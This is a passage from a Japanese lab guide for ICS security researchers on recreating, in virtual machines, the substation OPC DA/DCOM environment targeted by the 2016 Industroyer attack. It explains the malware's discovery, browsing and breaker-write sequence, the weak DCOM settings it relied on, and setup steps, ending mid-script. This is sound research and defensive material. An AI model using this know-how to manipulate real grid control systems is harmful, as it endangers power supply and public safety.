# OPC導入 指南書

**〜 Industroyer 攻撃対象環境の仮想再現 〜**

| 項目 | 内容 |
|---|---|
| **版数** | 第2版 |
| **作成日** | 2026年7月12日 |
| **対象読者** | ICS セキュリティ研究者・エンジニア |

---

## 目次

- [第1章 本書の目的と背景](#第1章-本書の目的と背景)
  - [1.1 目的](#11-目的)
  - [1.2 Industroyer 事件の概要](#12-industroyer-事件の概要)
  - [1.3 Industroyer のモジュール構成](#13-industroyer-のモジュール構成)
  - [1.4 OPC DA モジュールの動作詳細](#14-opc-da-モジュールの動作詳細)
- [第2章 攻撃対象の変電所構成](#第2章-攻撃対象の変電所構成)
  - [2.1 ウクライナ変電所の推定アーキテクチャ](#21-ウクライナ変電所の推定アーキテクチャ)
  - [2.2 各レイヤの技術的役割](#22-各レイヤの技術的役割)
  - [2.3 攻撃面の所在](#23-攻撃面の所在)
- [第3章 OPC DA / DCOM 技術概要](#第3章-opc-da--dcom-技術概要)
  - [3.1 OPC DA の通信モデル](#31-opc-da-の通信モデル)
  - [3.2 DCOM の認証メカニズム](#32-dcom-の認証メカニズム)
  - [3.3 OPC DA と OPC UA の位置関係](#33-opc-da-と-opc-ua-の位置関係)
- [第4章 仮想環境の全体設計](#第4章-仮想環境の全体設計)
  - [4.1 VM 構成とネットワーク設計](#41-vm-構成とネットワーク設計)
  - [4.2 ゲスト OS の選定](#42-ゲスト-os-の選定)
  - [4.3 使用ソフトウェア一覧](#43-使用ソフトウェア一覧)
- [第5章 IED シミュレータの構築（Layer 0）](#第5章-ied-シミュレータの構築layer-0)
  - [5.1 libIEC61850 によるサーバ構築](#51-libiec61850-によるサーバ構築)
  - [5.2 変電所データモデルの設計](#52-変電所データモデルの設計)
- [第6章 RTU/ゲートウェイの再現（Layer 1）](#第6章-rtuゲートウェイの再現layer-1)
  - [6.1 なぜここが中核か](#61-なぜここが中核か)
  - [6.2 方法A: KEPServerEX による再現](#62-方法a-kepserverex-による再現)
  - [6.3 方法B: OSS ブリッジによる自作](#63-方法b-oss-ブリッジによる自作)
  - [6.4 方法C: MatrikonOPC による簡易再現](#64-方法c-matrikonopc-による簡易再現)
- [第7章 SCADA / HMI の構成（Layer 2）](#第7章-scada--hmi-の構成layer-2)
  - [7.1 OPC DA クライアントの設定](#71-opc-da-クライアントの設定)
  - [7.2 Cogent DataHub による SCADA 模擬](#72-cogent-datahub-による-scada-模擬)
- [第8章 ヒストリアンの構成（Layer 3）](#第8章-ヒストリアンの構成layer-3)
  - [8.1 データベースの選定と構築](#81-データベースの選定と構築)
  - [8.2 OPC DA → DB ブリッジの設定](#82-opc-da--db-ブリッジの設定)
- [第9章 DCOM 認証環境の構成](#第9章-dcom-認証環境の構成)
  - [9.1 DCOM 設定の階層構造](#91-dcom-設定の階層構造)
  - [9.2 シナリオ別の設定値](#92-シナリオ別の設定値)
  - [9.3 ファイアウォールとポート設計](#93-ファイアウォールとポート設計)
- [第10章 環境の動作確認](#第10章-環境の動作確認)
  - [10.1 各レイヤの疎通確認](#101-各レイヤの疎通確認)
  - [10.2 Industroyer OPC DA モジュールの動作を手動で追体験する](#102-industroyer-opc-da-モジュールの動作を手動で追体験する)
  - [10.3 Wireshark による通信解析](#103-wireshark-による通信解析)
- [第11章 トラブルシューティング](#第11章-トラブルシューティング)
- [付録](#付録)
  - [A. 用語集](#a-用語集)
  - [B. 参考文献](#b-参考文献)

---

# 第1章 本書の目的と背景

## 1.1 目的

本書は、2016年12月のウクライナ変電所に対するサイバー攻撃（**Industroyer / CrashOverride**）において攻撃対象となった産業制御システムの構成を、仮想マシン上で可能な限り忠実に再現するための技術指南書である。

再現の対象は、Industroyer が搭載していた **OPC DA モジュール** が攻撃に利用したシステム層——すなわち、IEC 61850 対応 IED から OPC DA サーバ（RTU/ゲートウェイ）を経て SCADA/ヒストリアンに至るデータフロー——である。

本環境を構築することで、以下が可能になる：

- OPC DA（COM/DCOM）が持つ構造的な攻撃面の理解
- Industroyer OPC DA モジュールの動作原理の追体験
- 自社設備に対するリスク評価への応用

## 1.2 Industroyer 事件の概要

| 項目 | 内容 |
|---|---|
| **攻撃名** | Industroyer（別名: CrashOverride） |
| **攻撃者** | Sandworm（ロシア連邦軍参謀本部情報総局 GRU・Unit 74455） |
| **時期** | 2016年12月17日 |
| **標的** | ウクライナ Ukrenergo 社 北部変電所（ピヴニチナ変電所） |
| **結果** | キーウ北部および周辺地域で約75分間の大規模停電 |
| **特異性** | ICS プロトコルを直接操作するモジュールを4種搭載した、電力系統に特化したマルウェア |

**前段との区別:**
- **2015年12月** の攻撃（BlackEnergy3 + KillDisk）はウクライナ西部の配電会社3社を標的とし、VPN 経由で SCADA の GUI を遠隔操作（人手による操作）して遮断器を開放した。
- **2016年12月** の Industroyer は、プロトコルレベルで自動化された攻撃を実行した点で質的に異なる。人間が GUI を操作するのではなく、マルウェアが直接 ICS プロトコルのコマンドを発行した。

## 1.3 Industroyer のモジュール構成

Industroyer は以下のコンポーネントで構成される（ESET 解析レポートおよび Dragos レポートに基づく）：

```
[Main Backdoor]
    │
    ├── [Launcher] ─── スケジュール実行（Windows タスクスケジューラ）
    │
    ├── [Payload 1] ─── IEC 104 モジュール
    ├── [Payload 2] ─── IEC 61850 (MMS) モジュール
    ├── [Payload 3] ─── OPC DA モジュール        ← 本書の対象
    ├── [Payload 4] ─── IEC 101 (Serial) モジュール
    │
    ├── [Data Wiper] ─── 痕跡消去・システム破壊
    └── [DoS Tool] ──── Siemens SIPROTEC DoS（CVE-2015-5374）
```

各プロトコルモジュールの役割：

| モジュール | 対象プロトコル | 攻撃手法 | 通信レイヤ |
|---|---|---|---|
| Payload 1 | IEC 60870-5-104 | TCP/IP 経由の遠方監視制御コマンド発行 | TCP 2404 |
| Payload 2 | IEC 61850 MMS | MMS メッセージによる開閉器操作 | TCP 102 |
| **Payload 3** | **OPC DA** | **DCOM 経由で OPC サーバに接続、タグ Write** | **TCP 135 + 動的ポート** |
| Payload 4 | IEC 60870-5-101 | シリアル通信経由の制御コマンド発行 | RS-232/485 |

4つのモジュールは同一目的（遮断器の開放）を異なるプロトコル経路で実行する冗長設計であり、標的変電所がどのプロトコルを使用していても攻撃が成立するよう設計されている。

## 1.4 OPC DA モジュールの動作詳細

ESET の解析（"WIN32/INDUSTROYER: A new threat for industrial control systems", 2017）によれば、OPC DA モジュールは以下の手順で動作する：

### 動作シーケンス

```
Phase 1: 探索（Discovery）
  │
  ├── CoInitializeEx() で COM ランタイムを初期化
  ├── CoCreateInstanceEx() で OPCEnum（CLSID: 13486D51-4821-11D2-A494-3CB306C10000）に接続
  ├── IOPCServerList::EnumClassesOfCategories() で
  │   ネットワーク上の OPC DA サーバの CLSID を列挙
  └── 発見したサーバの ProgID / CLSID をリスト化
  │
Phase 2: 接続（Connection）
  │
  ├── 各 OPC DA サーバに対して CoCreateInstanceEx() で接続
  ├── IOPCServer インターフェースを取得
  └── 接続先は設定ファイルまたはハードコードされた IP / ProgID
  │
Phase 3: 走査（Browsing）
  │
  ├── IOPCBrowseServerAddressSpace::BrowseOPCItemIDs() で
  │   サーバのアドレス空間（タグツリー）を再帰的に探索
  ├── 全アイテム（タグ）の ItemID を収集
  └── フィルタリング: 制御対象（遮断器位置等）のタグを特定
  │
Phase 4: 操作（Manipulation）
  │
  ├── IOPCItemMgt::AddItems() で対象タグをグループに追加
  ├── IOPCSyncIO::Write() でタグの値を書き換え
  │   → 遮断器位置タグに「Open」コマンドを書き込み
  └── 一定時間後に逆の値を書き込む（開→閉の繰り返しによる物理的ダメージ誘発）
```

### 認証に関する重要な事実

OPC DA モジュールが DCOM 接続を確立する際、以下の2つの条件のいずれか（または両方）により、明示的なクレデンシャル入力なしに接続が成立していた：

1. **OPC DA サーバ側の DCOM 設定が緩い**: `ANONYMOUS LOGON` の許可、認証レベル `None` など、OPC DA の接続トラブル回避のために現場で広く行われていた設定緩和措置
2. **マルウェアが既に高権限プロセスとして動作**: Sandworm は事前に IT 網経由で Active Directory を侵害し、ドメイン管理者権限を奪取。DCOM は実行プロセスの Windows 資格情報を暗黙的に使用するため、高権限プロセスからの接続は透過的に認証が通る

---

# 第2章 攻撃対象の変電所構成

## 2.1 ウクライナ変電所の推定アーキテクチャ

公開情報（ESET、Dragos、SANS ICS レポート）および IEC 61850 対応変電所の標準的な構成に基づく推定構成：

```
┌─────────────────────────────────────────────────┐
│                 変電所構内ネットワーク             │
│                                                   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │  IED #1  │  │  IED #2  │  │  IED #3  │       │
│  │(保護リレー)│  │(保護リレー)│  │  (PMU)  │       │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘       │
│       │ IEC 61850    │ IEC 61850    │ IEC 61850   │
│       │ MMS          │ MMS          │ MMS         │
│       ▼              ▼              ▼             │
│  ┌────────────────────────────────────────┐       │
│  │  RTU / ゲートウェイ                     │       │
│  │  ┌──────────────┐  ┌──────────────┐   │       │
│  │  │ IEC 61850    │  │ OPC DA       │   │       │
│  │  │ MMS Client   │→ │ Server       │   │       │
│  │  └──────────────┘  └──────┬───────┘   │       │
│  └───────────────────────────┼────────────┘       │
│                              │ OPC DA (DCOM)       │
│                              │ TCP 135 + 動的ポート │
└──────────────────────────────┼─────────────────────┘
                               │
                    ───── 変電所 / 制御センター境界 ─────
                               │
┌──────────────────────────────┼─────────────────────┐
│               制御センター                          │
│                              ▼                      │
│  ┌────────────────────────────────────────┐        │
│  │  SCADA / HMI                            │        │
│  │  (OPC DA クライアント)                   │        │
│  └──────────────────┬─────────────────────┘        │
│                     │ ODBC / ADO                    │
│                     ▼                               │
│  ┌────────────────────────────────────────┐        │
│  │  ヒストリアン                            │        │
│  │  (時系列データベース)                    │        │
│  └────────────────────────────────────────┘        │
│                                                     │
│  ┌────────────────────────────────────────┐        │
│  │  EWS（エンジニアリングワークステーション）│        │
│  │  ← Industroyer はここから実行された      │        │
│  └────────────────────────────────────────┘        │
└─────────────────────────────────────────────────────┘
```

## 2.2 各レイヤの技術的役割

| レイヤ | 機器 | プロトコル（下位） | プロトコル（上位） | OS / 実装 |
|---|---|---|---|---|
| **Layer 0** | IED（保護リレー、PMU） | 電力系統バス | IEC 61850 MMS (TCP 102) | 組込み RTOS |
| **Layer 1** | RTU / ゲートウェイ | IEC 61850 MMS Client | OPC DA Server (DCOM) | Windows（XP～7 が多い） |
| **Layer 2** | SCADA / HMI | OPC DA Client | ODBC / 独自 API | Windows |
| **Layer 3** | ヒストリアン | ODBC / ADO | SQL クエリ | Windows / Linux |
| **侵害起点** | EWS / 踏み台端末 | - | - | Windows（ドメイン参加） |

## 2.3 攻撃面の所在

Industroyer OPC DA モジュールが利用した攻撃面：

| 攻撃面 | 技術的根拠 | 場所 |
|---|---|---|
| **OPCEnum による列挙** | OPCEnum サービス（DCOM オブジェクト）は認証なしで OPC サーバ一覧を返す実装が一般的 | RTU/ゲートウェイ (Layer 1) |
| **DCOM の緩い認証** | 認証レベル `None` / `Connect`、`ANONYMOUS LOGON` 許可の設定 | 同上 |
| **OPC DA の認可不在** | OPC DA 仕様にアイテム単位のアクセス制御（読み取り専用/書き込み禁止等）が存在しない | 同上 |
| **監査ログの欠如** | OPC DA（Classic）には監査イベントの標準仕様がない | 同上 |
| **フラットネットワーク** | IT/OT 間のセグメンテーション不足により、EWS から OPC DA サーバに直接到達可能 | ネットワーク全体 |

---

# 第3章 OPC DA / DCOM 技術概要

本章では、仮想環境構築に必要な OPC DA と DCOM の技術的知識を整理する。OPC 全般の歴史や OPC UA との比較は、本書の趣旨（環境再現）に直接関係しないため、攻撃面に関わる範囲に絞る。

## 3.1 OPC DA の通信モデル

OPC DA（Data Access）は、COM/DCOM 上に構築されたクライアント-サーバ型のリアルタイムデータアクセス仕様である。

**データ構造:**
- **Server**: OPC DA サーバプロセス（COM オブジェクト）。ProgID（例: `Kepware.KEPServerEX.V6`）で識別
- **Group**: アイテムの論理的集合。更新周期（Update Rate）とアクティブ状態を持つ
- **Item**: データの最小単位。`ItemID`（タグ名）で識別され、`Value`（VARIANT型）＋ `Quality`（OPC品質コード）＋ `Timestamp` の三要素を持つ

**COM インターフェース（攻撃に関連するもの）:**

| インターフェース | 用途 | Industroyer での使用 |
|---|---|---|
| `IOPCServerList` | OPCEnum 経由でサーバを列挙 | Phase 1: Discovery |
| `IOPCServer` | サーバへの接続、グループ管理 | Phase 2: Connection |
| `IOPCBrowseServerAddressSpace` | タグツリーの探索 | Phase 3: Browsing |
| `IOPCItemMgt` | グループへのアイテム追加/削除 | Phase 4 準備 |
| `IOPCSyncIO` | 同期的な Read / Write | Phase 4: Write による制御 |

**OPCEnum サービス:**
OPC Foundation が提供するシステムサービスで、ローカルマシン上に登録された OPC DA サーバの一覧をリモートクライアントに提供する。DCOM オブジェクトとして公開され、CLSID `13486D51-4821-11D2-A494-3CB306C10000` で識別される。Industroyer はまずこのサービスに接続してネットワーク上の OPC サーバを探索した。

## 3.2 DCOM の認証メカニズム

DCOM はその設計上、以下の多層的な認証・認可構造を持つ。Industroyer の動作を理解する上で、各層が「どう突破されたか」を把握する必要がある。

### 認証レベル（Authentication Level）

| 定数 | 値 | 意味 | 攻撃耐性 |
|---|---|---|---|
| `RPC_C_AUTHN_LEVEL_NONE` | 1 | 認証なし | なし |
| `RPC_C_AUTHN_LEVEL_CONNECT` | 2 | 接続時のみ認証 | 初回のみ |
| `RPC_C_AUTHN_LEVEL_CALL` | 3 | 各呼出時に認証 | 低 |
| `RPC_C_AUTHN_LEVEL_PKT` | 4 | パケットごとに認証 | 中 |
| `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` | 5 | 改ざん検知付き | 高 |
| `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` | 6 | 暗号化付き | 最高 |

ICS 環境では OPC DA の接続トラブル回避のために `NONE` や `CONNECT` に設定されることが多く、これが攻撃を容易にした。

### DCOM セキュリティの設定階層

```
① システム既定（マイ コンピュータ → プロパティ）
   ├── 既定の認証レベル
   ├── 既定の偽装レベル
   ├── COM セキュリティ
   │    ├── アクセス許可（既定 / 制限）
   │    └── 起動/アクティブ化の許可（既定 / 制限）
   │
② アプリケーション固有（DCOM の構成 → [OPC サーバ名]）
   ├── 認証レベル（①を上書き可能）
   ├── セキュリティ（①を上書き可能）
   └── ID（実行ユーザ: 対話ユーザ / このユーザ / SYSTEM）
```

**ポイント:** ②がカスタマイズされていない場合、①の既定値が適用される。①が緩ければ、個別の OPC サーバも緩い認証で動作する。

### クレデンシャルの暗黙的使用

DCOM クライアント（OPC DA クライアント）が `CoCreateInstanceEx()` でリモートの DCOM オブジェクトに接続する際、明示的にクレデンシャルを指定しなければ、**呼出元プロセスの Windows セキュリティコンテキスト（ログオンセッションの資格情報）** が暗黙的に使用される。

これは以下を意味する：
- マルウェアがドメイン管理者権限で実行されていれば、対象マシンへの認証は透過的に成功する
- `COAUTHINFO` 構造体で明示的にクレデンシャルを指定することも可能（窃取済みの資格情報を使用する場合）

## 3.3 OPC DA と OPC UA の位置関係

| 観点 | OPC DA（Classic） | OPC UA |
|---|---|---|
| 基盤 | Windows COM/DCOM | プラットフォーム非依存 |
| 認証 | DCOM に委譲（仕様外） | X.509 証明書 ＋ ユーザトークン（仕様内） |
| 認可 | なし（仕様に含まれない） | ノード単位のアクセス制御 |
| 監査 | なし | AuditEventType による標準化 |
| ポート | TCP 135 ＋ 動的ポート | TCP 4840（固定） |
| 国際標準 | なし（デファクト） | IEC 62541 |

Industroyer が OPC DA を標的にしたのは、2016年時点のウクライナの変電所インフラが OPC Classic ベースであったことによる。OPC UA 環境であれば、証明書認証や認可制御により、同じ攻撃手法の適用は困難になる（ただし、OPC UA にも `SecurityMode=None` という設定が存在し、それが使われていれば同様の問題が生じる）。

---

# 第4章 仮想環境の全体設計

## 4.1 VM 構成とネットワーク設計

第2章のアーキテクチャを以下の VM 構成で再現する：

```
   ホスト OS
      │
      ├── VirtualBox ホストオンリーネットワーク: 192.168.56.0/24
      │
      │   ┌─────────────────────────────────────────────────┐
      │   │ OT ネットワーク（変電所構内）                      │
      │   │                                                   │
      ├───┤ VM1: IED シミュレータ             192.168.56.10   │
      │   │      libIEC61850 サーバ                           │
      │   │      (Layer 0)                                    │
      │   │                                                   │
      ├───┤ VM2: RTU / ゲートウェイ           192.168.56.20   │
      │   │      IEC 61850 Client + OPC DA Server             │
      │   │      (Layer 1) ← 主要な攻撃面                     │
      │   │                                                   │
      │   └─────────────────────────────────────────────────┘
      │
      │   ┌─────────────────────────────────────────────────┐
      │   │ 制御センターネットワーク                          │
      │   │                                                   │
      ├───┤ VM3: SCADA / HMI + ヒストリアン   192.168.56.30   │
      │   │      OPC DA Client + SQL Server Express           │
      │   │      (Layer 2 + 3)                                │
      │   │                                                   │
      ├───┤ VM4: EWS（攻撃起点）              192.168.56.40   │
      │   │      Industroyer OPC DA モジュールの動作再現用     │
      │   │      (省略可: VM3 と統合可能)                      │
      │   │                                                   │
      │   └─────────────────────────────────────────────────┘
      │
```

> **注:** 実際の Industroyer 攻撃では IT/OT 間のセグメンテーション不足が侵害を可能にした。本環境では意図的に全 VM を同一サブネットに配置し、この「フラットネットワーク」を再現する。セグメンテーション導入後の効果を検証する場合は、VirtualBox の内部ネットワークを分離して構成する。

### VirtualBox ネットワーク設定

```
[ファイル] → [ツール] → [ネットワークマネージャ]
→ [作成]
→ アダプター:
     IPv4 アドレス: 192.168.56.1
     ネットマスク: 255.255.255.0
→ DHCP サーバー: 無効化
→ [適用]
```

各 VM のネットワーク設定: [設定] → [ネットワーク] → アダプター1: **ホストオンリーアダプター**

> **DCOM は NAT 越し不可。** VirtualBox の NAT モードでは DCOM のコールバック（サーバ→クライアント方向の通信）が成立しない。必ずホストオンリーまたはブリッジを使用すること。

## 4.2 ゲスト OS の選定

| VM | 推奨 OS | 根拠 |
|---|---|---|
| VM1 (IED) | **Windows 7 SP1** または **Linux** | libIEC61850 のビルドが容易。Linux であれば GCC + CMake で完結 |
| VM2 (RTU/GW) | **Windows XP SP3** または **Windows 7 SP1** | 2016年時点のウクライナ変電所 RTU は旧世代 Windows で稼働していた蓋然性が高い。DCOM の設定挙動を忠実に再現するには XP/7 が適切 |
| VM3 (SCADA/DB) | **Windows 7 SP1** | SQL Server Express + OPC クライアントの動作環境 |
| VM4 (EWS) | **Windows 7 SP1** 以降 | 攻撃再現用。Python + OpenOPC が動作すればよい |

> **Windows XP の入手:** MSDN サブスクリプションまたは Internet Archive 等から ISO を取得。SP3 必須（SP2 以前は DCOM セキュリティモデルが旧式）。

## 4.3 使用ソフトウェア一覧

### IEC 61850 関連

| ソフトウェア | 種別 | 用途 | 入手先 |
|---|---|---|---|
| **libIEC61850** | OSS (GPLv3) | IED シミュレータ（MMS サーバ）の構築 | https://github.com/mz-automation/libiec61850 |
| **IEDScout** (Omicron) | 評価版 (30日) | MMS ブラウズ・接続確認用 GUI | https://www.omicronenergy.com/en/products/iedscout/ |

### OPC DA 関連

| ソフトウェア | 種別 | 用途 | 入手先 |
|---|---|---|---|
| **KEPServerEX** (PTC/Kepware) | デモ (2時間制限、無期限) | RTU/ゲートウェイ再現（IEC 61850 → OPC DA） | https://www.kepware.com/demo-download/ |
| **MatrikonOPC Server for Simulation** | 無料 | OPC DA サーバ簡易再現 | https://www.matrikonopc.com/ |
| **MatrikonOPC Explorer** | 無料 | OPC DA クライアント / タグブラウザ | 同上 |
| **OPC Core Components** | 無料 | OPC DA ランタイム（OPCEnum 等） | https://opcfoundation.org/ |
| **OpenOPC** | OSS (GPLv2) | Python から OPC DA を操作 | https://openopc2.readthedocs.io/ |

### データブリッジ / SCADA

| ソフトウェア | 種別 | 用途 | 入手先 |
|---|---|---|---|
| **Cogent DataHub** | 評価版 (30日) | OPC DA クライアント ＋ DB ブリッジ | 本ワークスペース同梱 |

### ヒストリアン

| ソフトウェア | 種別 | 用途 | 入手先 |
|---|---|---|---|
| **SQL Server 2019 Express** | 無料 (10GB) | ヒストリアン DB | https://www.microsoft.com/ja-jp/sql-server/sql-server-downloads |
| **MySQL Community** | OSS (GPLv2) | 代替 DB | https://dev.mysql.com/downloads/ |

### 解析ツール

| ソフトウェア | 種別 | 用途 | 入手先 |
|---|---|---|---|
| **Wireshark** | OSS (GPLv2) | DCOM / MMS パケット解析 | https://www.wireshark.org/ |

---

# 第5章 IED シミュレータの構築（Layer 0）

## 5.1 libIEC61850 によるサーバ構築

### ビルド手順

```bash
# Linux の場合（VM1 を Linux にする場合）
git clone https://github.com/mz-automation/libiec61850.git
cd libiec61850
mkdir build && cd build
cmake ..
make -j$(nproc)

# Windows の場合（Visual Studio または MinGW）
git clone https://github.com/mz-automation/libiec61850.git
cd libiec61850
mkdir build && cd build
cmake .. -G "Visual Studio 16 2019"
cmake --build . --config Release
```

### サンプルサーバの起動と確認

```bash
# サーバ起動（デフォルト: port 102）
cd examples/server_example_basic/
./server_example_basic

# 別ターミナルからクライアントで接続確認
cd examples/iec61850_client_example1/
./iec61850_client_example1 192.168.56.10
```

## 5.2 変電所データモデルの設計

Industroyer が操作対象としたのは変電所の遮断器（Circuit Breaker）である。IEC 61850 のデータモデルとして、以下の論理ノードを含むサーバを構成する：

### IEC 61850 データモデル（変電所模擬）

```
IED（論理デバイス: CBIED）
  │
  ├── LLN0 (Logical Node Zero)
  │   └── ST (Status)
  │       └── Beh.stVal  → 動作モード (on/blocked/test/off)
  │
  ├── XCBR1 (Circuit Breaker #1 - 遮断器)
  │   ├── ST (Status)
  │   │   └── Pos.stVal  → 遮断器位置 (00=中間, 01=Off/Open, 10=On/Closed)
  │   └── CO (Control)
  │       └── Pos.Oper   → 遮断器制御 (Open/Close コマンド)
  │
  ├── XSWI1 (Disconnector #1 - 断路器)
  │   └── ST
  │       └── Pos.stVal  → 断路器位置
  │
  └── MMXU1 (Measurement Unit - 計測)
      └── MX (Measurement)
          ├── A.phsA.cVal   → A相電流
          ├── A.phsB.cVal   → B相電流
          ├── A.phsC.cVal   → C相電流
          ├── PhV.phsA.cVal → A相電圧
          └── Hz.mag.f      → 周波数
```

### カスタムサーバの構成ファイル（ICD/SCL）

libIEC61850 では SCL（Substation Configuration Language）ファイルで IED のデータモデルを定義できる。`examples/server_example_basic/` のモデル定義を上記構成に合わせてカスタマイズする。

具体的には `static_model.cfg` または ICD ファイルを編集し、`XCBR`（遮断器）、`XSWI`（断路器）、`MMXU`（計測ユニット）の論理ノードを含むモデルを作成する。libIEC61850 には `tools/model_generator` が付属しており、ICD ファイルから C ソースコードを自動生成できる。

---

# 第6章 RTU/ゲートウェイの再現（Layer 1）

## 6.1 なぜここが中核か

RTU/ゲートウェイは、IEC 61850 MMS で取得したデータを OPC DA サーバとして公開する中間層である。Industroyer OPC DA モジュールが直接対話した相手はこの VM 上の OPC DA サーバプロセスであり、本環境構築における最も重要なコンポーネントである。

再現にあたっては、以下の2つの機能を同一 VM（VM2）上で稼働させる必要がある：

1. **IEC 61850 MMS クライアント**: VM1 の IED から MMS でデータを取得
2. **OPC DA サーバ**: 取得データを COM/DCOM 経由で外部に公開

以下に3つの再現方法を示す。忠実度の高い順に記載する。

## 6.2 方法A: KEPServerEX による再現（推奨）

KEPServerEX は産業用 OPC サーバの事実上の標準製品であり、IEC 61850 MMS Client ドライバと OPC DA サーバ機能を単一プロセスで提供する。実際の変電所 RTU で KEPServerEX（または同等製品）が稼働していた可能性が高く、最も忠実な再現となる。

### インストールと設定

```
1. https://www.kepware.com/demo-download/ からインストーラをダウンロード
   ※ デモモードは機能制限なし、2時間で自動シャットダウン（再起動で再度2時間使用可能）

2. VM2（Windows 7）にインストール
   → IEC 61850 MMS Client ドライバを選択してインストール

3. KEPServerEX Configuration を起動
```

### IEC 61850 チャネルの設定

```
Configuration:

[Connectivity] → 右クリック → [New Channel]
  → Driver: IEC 61850 MMS Client
  → Channel Name: IEC61850_Ch1
  → [Next]

[Devices] → 右クリック → [New Device]
  → Device Name: IED1
  → IP Address: 192.168.56.10
  → Port: 102
  → Model Import: ICD/SCL ファイルを指定（または Auto Tag Generation で動的取得）
  → [Finish]

→ タグが自動生成される:
     IEC61850_Ch1.IED1.CBIED.XCBR1.ST.Pos.stVal  (遮断器位置)
     IEC61850_Ch1.IED1.CBIED.MMXU1.MX.A.phsA.cVal (A相電流)
     ...
```

### OPC DA サーバとしての公開

KEPServerEX はインストール時点で OPC DA サーバとして自動登録される。

- **ProgID**: `Kepware.KEPServerEX.V6`
- **CLSID**: インストール時に自動登録
- **OPCEnum への登録**: 自動

VM3 / VM4 からの OPC DA クライアント接続で上記 ProgID を指定すれば、IEC 61850 由来のタグが OPC DA アイテムとして参照・書き込み可能になる。

## 6.3 方法B: OSS ブリッジによる自作

KEPServerEX を使わず、OSS のみで RTU/ゲートウェイの機能を再現する方法。構造をより深く理解できるが、構築工数は大きい。

### アーキテクチャ

```
┌─────────── VM2 内部 ───────────────────────────┐
│                                                  │
│  [libIEC61850 Client]  →  [Bridge Script]  →  [MatrikonOPC Server] │
│    MMS Read/Report         Python               OPC DA Server      │
│    (192.168.56.10:102)     (値の中継)           (DCOM 公開)         │
│                                                  │
└──────────────────────────────────────────────────┘
```

- **libIEC61850**: MMS クライアントとして VM1 の IED からデータを取得
- **MatrikonOPC Simulation Server**: OPC DA サーバ本体。外部から Write 可能なタグを持つ
- **ブリッジスクリプト（Python）**: libIEC61850 で取得した値を、OpenOPC 経由で MatrikonOPC Server のタグに書き込む

### MatrikonOPC Server のタグ設計

MatrikonOPC Simulation Server のタグ構成を変電所機器に合わせて設定する：

```
タグ構成（IEC 61850 のデータモデルに対応）:

Substation/
├── Bay1/
│   ├── XCBR1/
│   │   ├── Pos_stVal     (Int: 1=Open, 2=Closed)   ← 遮断器位置
│   │   ├── Pos_Oper      (Int: 制御コマンド)        ← Write 対象
│   │   └── Beh_stVal     (Int: 動作モード)
│   └── XSWI1/
│       └── Pos_stVal     (Int: 断路器位置)
├── Bay2/
│   └── XCBR2/
│       ├── Pos_stVal
│       └── Pos_Oper
└── Measurement/
    ├── PhaseA_Current     (Float: A相電流 [A])
    ├── PhaseB_Current     (Float: B相電流 [A])
    ├── PhaseC_Current     (Float: C相電流 [A])
    ├── BusVoltage_kV      (Float: 母線電圧 [kV])
    └── Frequency_Hz       (Float: 周波数 [Hz])
```

### ブリッジスクリプト

```python
"""
RTU/Gateway Bridge: IEC 61850 MMS → OPC DA
libIEC61850 の Python バインディング + OpenOPC を使用
"""
import time
import OpenOPC

# --- IEC 61850 バインディング（利用可能な場合）---
try:
    import iec61850
    HAS_IEC61850 = True
except ImportError:
    HAS_IEC61850 = False

# --- 定数 ---
IED_IP       = "192.168.56.10"
IED_PORT     = 102
OPC_SERVER   = "MatrikonOPC.Simulation.1"
POLL_INTERVAL = 1.0

# IEC 61850 Reference → OPC DA ItemID マッピング
TAG_MAP = {
    "CBIED/XCBR1$ST$Pos$stVal":       "Substation.Bay1.XCBR1.Pos_stVal",
    "CBIED/XSWI1$ST$Pos$stVal":       "Substation.Bay1.XSWI1.Pos_stVal",
    "CBIED/MMXU1$MX$A$phsA$cVal$f":   "Substation.Measurement.PhaseA_Current",
    "CBIED/MMXU1$MX$A$phsB$cVal$f":   "Substation.Measurement.PhaseB_Current",
    "CBIED/MMXU1$MX$A$phsC$cVal$f":   "Substation.Measurement.PhaseC_Current",
    "CBIED/MMXU1$MX$PhV$phsA$cVal$f": "Substation.Measurement.BusVoltage_kV",
    "CBIED/MMXU1$MX$Hz$mag$f":        "Substation.Measurement.Frequency_Hz",
}


def read_ied(conn):
    """IEC 61850 MMS 経由で IED からデータを読み取る"""
    values = {}
    for iec_ref, opc_tag in TAG_MAP.items():
        try:
            # IedConnection_readObject は MDA (MMS Data Access) を使用
            mms_val = iec61850.IedConnection_readObject(
                conn, iec_ref, iec61850.IEC61850_FC_ST
            )
            if mms_val is not None:
                values[opc_tag] = iec61850.MmsValue_toFloat(mms_val)
                iec61850.MmsValue_delete(mms_val)
        except Exception as e:
            print(f"MMS read error [{iec_ref}]: {e}")
    return values


def simulate_ied():
    """IEC 61850 ライブラリ未使用時のシミュレーション"""
    import math, random
    t = time.time()
    return {
        "Substation.Bay1.XCBR1.Pos_stVal":       2,    # Closed
        "Substation.Bay1.XSWI1.Pos_stVal":       2,    # Closed
        "Substation.Measurement.PhaseA_Current":  250.0 + random.gauss(0, 3),
        "Substation.Measurement.PhaseB_Current":  248.0 + random.gauss(0, 3),
        "Substation.Measurement.PhaseC_Current":  251.0 + random.gauss(0, 3),
        "Substation.Measurement.BusVoltage_kV":   110.0 + math.sin(t/10) * 0.5,
        "Substation.Measurement.Frequency_Hz":    50.0 + math.sin(t/30) * 0.02,
    }


def main():
    # OPC DA サーバ接続
    opc = OpenOPC.client()
    opc.connect(OPC_SERVER)
    print(f"[+] OPC DA connected: {OPC_SERVER}")

    # IEC 61850 接続
    ied_conn = None
    if HAS_IEC61850:
        ied_conn = iec61850.IedConnection_create()
        err = iec61850.IedConnection_connect(ied_conn, IED_IP, IED_PORT)
        if err == iec61850.IED_ERROR_OK:
            print(f"[+] IEC 61850 connected: {IED_IP}:{IED_PORT}")
        else:
            print(f"[-] IEC 61850 connection failed (err={err}), using simulation")
            ied_conn = None

    try:
        while True:
            data = read_ied(ied_conn) if ied_conn else simulate_ied()
            for tag, val in data.items():
                opc.write((tag, val))
            ts = time.strftime('%H:%M:%S')
            print(f"[{ts}] Bridged {len(data)} points | "
                  f"CB1={data.get('Substation.Bay1.XCBR1.Pos_stVal','?')} "
                  f"V={data.get('Substation.Measurement.BusVoltage_kV','?'):.1f}kV")
            time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        print("\n[*] Bridge stopped")
    finally:
        opc.close()
        if ied_conn:
